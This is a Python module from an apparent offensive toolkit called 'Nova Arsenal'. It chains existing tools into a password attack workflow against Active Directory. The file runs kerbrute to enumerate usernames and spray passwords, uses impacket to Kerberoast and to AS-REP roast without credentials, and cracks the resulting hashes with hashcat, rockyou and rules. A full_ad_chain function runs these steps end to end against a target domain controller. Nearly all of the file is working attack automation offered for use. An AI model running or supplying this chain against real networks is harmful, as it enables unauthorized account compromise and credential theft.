"""
Nova Arsenal — Password Cracking Chain
Chains hashcat, impacket, kerbrute, and SecLists for hash cracking workflows.
"""

import os
import subprocess
import shutil
from pathlib import Path

ARSENAL_ROOT = Path(__file__).resolve().parents[3]
CLONE_DIR    = ARSENAL_ROOT.parent / "cloned_repos"
SECLISTS     = CLONE_DIR / "SecLists"
HASHCAT_BIN  = CLONE_DIR / "hashcat" / "hashcat"
IMPACKET_DIR = CLONE_DIR / "impacket"
KERBRUTE_DIR = CLONE_DIR / "kerbrute"

# Top wordlists from SecLists, ordered by effectiveness
WORDLISTS = [
    SECLISTS / "Passwords" / "Leaked-Databases" / "rockyou.txt",
    SECLISTS / "Passwords" / "Common-Credentials" / "10-million-password-list-top-1000000.txt",
    SECLISTS / "Passwords" / "Common-Credentials" / "top-passwords-shortlist.txt",
]

# hashcat -m values for common hash types
HASH_MODES = {
    "ntlm":       1000,
    "ntlmv2":     5600,
    "md5":           0,
    "sha1":        100,
    "sha256":     1400,
    "sha512":     1700,
    "bcrypt":     3200,
    "sha512crypt":1800,
    "wpa2":       22000,
    "kerberoast": 13100,   # Kerberos 5 TGS-REP etype 23
    "asreproast": 18200,   # Kerberos 5 AS-REP etype 23
}


class CrackChain:
    def __init__(self, verbose: bool = False):
        self.verbose = verbose

    # ─────────────────────────────────────────────
    # HASHCAT
    # ─────────────────────────────────────────────
    def crack_hashcat(self, hashes_file: str, hash_type: str = "ntlm",
                      wordlist: str | None = None, rules: bool = True,
                      brute: str | None = None):
        """
        Run hashcat against a hash file.
        hash_type: ntlm | ntlmv2 | md5 | sha1 | sha256 | sha512 |
                   bcrypt | sha512crypt | wpa2 | kerberoast | asreproast
        """
        mode = HASH_MODES.get(hash_type.lower())
        if mode is None:
            print(f"[!] Unknown hash type '{hash_type}'. Known: {', '.join(HASH_MODES)}")
            return

        hashcat = str(HASHCAT_BIN) if HASHCAT_BIN.exists() else shutil.which("hashcat")
        if not hashcat:
            print("[!] hashcat not found. Install it: apt install hashcat")
            return

        out = f"{hashes_file}.cracked"

        if brute:
            cmd = [hashcat, "-a", "3", "-m", str(mode), hashes_file, brute,
                   "-o", out, "--outfile-format=2"]
            print(f"[*] Hashcat brute-force mask: {brute}")
        else:
            wl = wordlist or str(next((w for w in WORDLISTS if w.exists()), WORDLISTS[0]))
            cmd = [hashcat, "-a", "0", "-m", str(mode), hashes_file, wl,
                   "-o", out, "--outfile-format=2"]
            if rules:
                cmd += ["--rules-file", str(HASHCAT_BIN.parent / "rules" / "best64.rule")]
            print(f"[*] Hashcat wordlist attack: {wl}")

        print(f"[*] Mode: {hash_type} (-m {mode})")
        print(f"[*] Output: {out}")
        if self.verbose:
            print(f"[*] CMD: {' '.join(cmd)}")

        try:
            subprocess.run(cmd, check=False)
        except FileNotFoundError:
            print("[!] hashcat binary not found at expected path. Try: pip install hashcat")

    # ─────────────────────────────────────────────
    # KERBRUTE — username enum + password spray
    # ─────────────────────────────────────────────
    def kerbrute_enum(self, domain: str, dc: str, userlist: str | None = None):
        """Enumerate valid AD usernames via Kerberos (no lockout risk)."""
        kerbrute = shutil.which("kerbrute") or str(KERBRUTE_DIR / "kerbrute_linux_amd64")

        if not Path(kerbrute).exists():
            print("[!] kerbrute binary not found. Build it: cd cloned_repos/kerbrute && go build")
            return

        ul = userlist or str(
            SECLISTS / "Usernames" / "Names" / "names.txt"
        )
        cmd = [kerbrute, "userenum", "--dc", dc, "-d", domain, ul]
        print(f"[*] Kerbrute userenum → {domain} via {dc}")
        if self.verbose:
            print(f"[*] CMD: {' '.join(cmd)}")
        subprocess.run(cmd, check=False)

    def kerbrute_spray(self, domain: str, dc: str, userlist: str, password: str):
        """Password spray a single password against a user list."""
        kerbrute = shutil.which("kerbrute") or str(KERBRUTE_DIR / "kerbrute_linux_amd64")
        cmd = [kerbrute, "passwordspray", "--dc", dc, "-d", domain, userlist, password]
        print(f"[*] Kerbrute spray: '{password}' against {domain}")
        subprocess.run(cmd, check=False)

    # ─────────────────────────────────────────────
    # IMPACKET — Kerberoast / AS-REP Roast
    # ─────────────────────────────────────────────
    def kerberoast(self, domain: str, user: str, password: str, dc: str,
                   out: str = "kerberoast_hashes.txt"):
        """Extract Kerberoastable TGS hashes via impacket GetUserSPNs.py"""
        script = IMPACKET_DIR / "examples" / "GetUserSPNs.py"
        if not script.exists():
            script_path = shutil.which("GetUserSPNs.py") or "GetUserSPNs.py"
        else:
            script_path = str(script)

        cmd = ["python3", script_path,
               f"{domain}/{user}:{password}",
               "-dc-ip", dc, "-request",
               "-outputfile", out]
        print(f"[*] Kerberoasting {domain} via {dc}")
        print(f"[*] Hashes → {out}")
        subprocess.run(cmd, check=False)
        if Path(out).exists():
            print(f"[+] Got hashes! Crack with: nova_arsenal.py crack --hashcat {out} --type kerberoast")

    def asrep_roast(self, domain: str, dc: str, userlist: str,
                    out: str = "asrep_hashes.txt"):
        """AS-REP Roast (no creds needed) via impacket GetNPUsers.py"""
        script = IMPACKET_DIR / "examples" / "GetNPUsers.py"
        if not script.exists():
            script_path = shutil.which("GetNPUsers.py") or "GetNPUsers.py"
        else:
            script_path = str(script)

        cmd = ["python3", script_path,
               f"{domain}/",
               "-dc-ip", dc,
               "-usersfile", userlist,
               "-no-pass", "-format", "hashcat",
               "-outputfile", out]
        print(f"[*] AS-REP Roasting {domain} (no creds) via {dc}")
        subprocess.run(cmd, check=False)
        if Path(out).exists():
            print(f"[+] Got hashes! Crack with: nova_arsenal.py crack --hashcat {out} --type asreproast")

    # ─────────────────────────────────────────────
    # FULL CHAIN
    # ─────────────────────────────────────────────
    def full_ad_chain(self, domain: str, dc: str, userlist: str | None = None):
        """
        Full AD password attack chain:
        1. Kerbrute userenum → discover valid users
        2. AS-REP Roast      → hash users with no preauth
        3. Hashcat            → crack AS-REP hashes with rockyou
        """
        print("\n[Nova] ══ Full AD Chain ══")
        print(f"  Domain: {domain}  DC: {dc}\n")

        # Step 1
        print("[1/3] Username enumeration")
        self.kerbrute_enum(domain, dc, userlist)

        # Step 2
        ul = userlist or str(SECLISTS / "Usernames" / "Names" / "names.txt")
        print("\n[2/3] AS-REP Roasting (no creds)")
        self.asrep_roast(domain, dc, ul)

        # Step 3
        if Path("asrep_hashes.txt").exists():
            print("\n[3/3] Cracking hashes with hashcat + rockyou")
            self.crack_hashcat("asrep_hashes.txt", hash_type="asreproast")
        else:
            print("\n[3/3] No hashes found — try credential-based kerberoasting")

    def list_wordlists(self):
        """Show available SecLists wordlists."""
        print("[*] Available SecLists wordlists:")
        for wl in WORDLISTS:
            status = "✓" if wl.exists() else "✗ missing"
            print(f"  [{status}] {wl}")

    def show_modes(self):
        """Print supported hash types."""
        print("[*] Supported hash types (--type):")
        for name, mode in HASH_MODES.items():
            print(f"  {name:<15} -m {mode}")
